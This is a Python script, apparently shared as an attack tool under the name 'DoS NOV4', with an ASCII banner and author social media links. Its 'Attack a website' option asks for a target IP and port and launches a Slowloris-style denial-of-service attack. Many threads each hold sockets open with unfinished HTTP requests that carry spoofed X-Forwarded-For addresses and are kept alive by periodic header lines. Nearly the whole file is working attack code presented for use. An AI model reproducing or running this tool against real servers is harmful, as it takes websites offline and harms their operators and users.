import socket
import colorama
import threading
import time
import requests
import getpass
import random
import pyfiglet
from pyfiglet import Figlet
from colorama import Fore, Back, Style



banner = Fore.LIGHTGREEN_EX + f"""
{Fore.WHITE}▓█████▄  ▒█████    ██████     {Fore.LIGHTGREEN_EX}███▄    █  ▒█████   ██▒   █▓ ▄▄▄      
{Fore.WHITE}▒██▀ ██▌▒██▒  ██▒▒██    ▒     {Fore.LIGHTGREEN_EX}██ ▀█   █ ▒██▒  ██▒▓██░   █▒▒████▄    
{Fore.WHITE}░██   █▌▒██░  ██▒░ ▓██▄      {Fore.LIGHTGREEN_EX}▓██  ▀█ ██▒▒██░  ██▒ ▓██  █▒░▒██  ▀█▄  
{Fore.LIGHTGREEN_EX}░▓█▄   ▌▒██   ██░  ▒   ██▒  {Fore.WHITE} ▓██▒  ▐▌██▒▒██   ██░  ▒██ █░░░██▄▄▄▄██ 
{Fore.LIGHTGREEN_EX}░▒████▓ ░ ████▓▒░▒██████▒▒   {Fore.WHITE}▒██░   ▓██░░ ████▓▒░   ▒▀█░   ▓█   ▓██▒
{Fore.LIGHTGREEN_EX} ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   {Fore.WHITE}░ ▒░   ▒ ▒ ░ ▒░▒░▒░    ░ ▐░   ▒▒   ▓▒█░
 ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░   {Fore.WHITE}░ ░░   ░ ▒░  ░ ▒ ▒░    ░ ░░    ▒   ▒▒ ░
 ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░        {Fore.WHITE}░   ░ ░ ░ ░ ░ ▒       ░░    ░   ▒   
   ░        ░ ░        ░              ░     ░ ░        ░        ░  ░
 ░                                                    ░


"""
print(banner)
print(f"{Fore.LIGHTGREEN_EX}Coded by {Fore.WHITE}th3g3nt3lman ")
print(f"{Fore.LIGHTGREEN_EX}Twitter: {Fore.WHITE}https://x.com/th3g3nt3lmannnn")
print(f"{Fore.LIGHTGREEN_EX}NOV4 TWITTER: {Fore.WHITE}https://x.com/nov4_d3ds3c")

print(f"{Fore.LIGHTGREEN_EX}─────────────────────────────────────────────────────────────")
print(f"  [1] {Fore.WHITE}Attack a website                                       ")
print("                                                             ")
print(f"  {Fore.LIGHTGREEN_EX}[99] {Fore.WHITE}Exit                                                  ")
print("                                                             ")
print(f"{Fore.LIGHTGREEN_EX}─────────────────────────────────────────────────────────────")

time.sleep(2)

scee = int(input("Option: "))

if scee == 1:
    primo_avviso = f"{Fore.LIGHTGREEN_EX}[{Fore.YELLOW}*{Fore.LIGHTGREEN_EX}] {Fore.WHITE}You choose attack a website...\n "

    for bb in primo_avviso:
        print(bb, end='', flush=True)
        time.sleep(0.1)

    url = input(f"{Fore.LIGHTGREEN_EX}Enter the IP: {Fore.WHITE}")
    port = int(input(f"{Fore.LIGHTGREEN_EX}Port:{Fore.WHITE} "))
    numero_connessioni_per_i_threads = int(input(f"{Fore.LIGHTGREEN_EX}connections per thread:{Fore.WHITE} "))
    secondi_tra_invii = 5
    numero_di_threads =  int(input(f"{Fore.LIGHTGREEN_EX}Number of threads:{Fore.WHITE} "))

    def generate_fakkip():
        return f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        
    def nov4_thread(thread_id):
        sockets = []
        for i in range(numero_connessioni_per_i_threads):
            try:
                soo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                soo.connect((url, port))
                fake_ip = generate_fakkip()
                richiesta = f"GET / HTTP/1.1\r\nHost: {url}\r\nUser-Agent: NOV4\r\nX-Forwarded-For: {fake_ip}\r\n"
                soo.send(richiesta.encode('utf-8'))
                sockets.append(soo)
                print(f"{Fore.LIGHTGREEN_EX}Thread {Fore.WHITE}{thread_id} connection {i+1} {Fore.LIGHTGREEN_EX}opened with IP {Fore.WHITE}{fake_ip}")
            except Exception as e:
                print(f"Thread {thread_id}] Error: ", e)

        try:
            while True:
                for soo in sockets:
                    try:
                        soo.send(b"X-a: b\r\n")
                    except:
                        sockets.remove(soo)
                print(f"{Fore.LIGHTGREEN_EX}Thread {Fore.WHITE}{thread_id} keep opened {len(sockets)} connections")
                time.sleep(secondi_tra_invii)
        except KeyboardInterrupt:
            for soo in sockets:
                soo.close()   

    threads = []
    for tt in range(numero_di_threads):
        thread = threading.Thread(target=nov4_thread, args=(tt+1,))
        thread.start()
        threads.append(thread)
else:
    quit()


      
        
 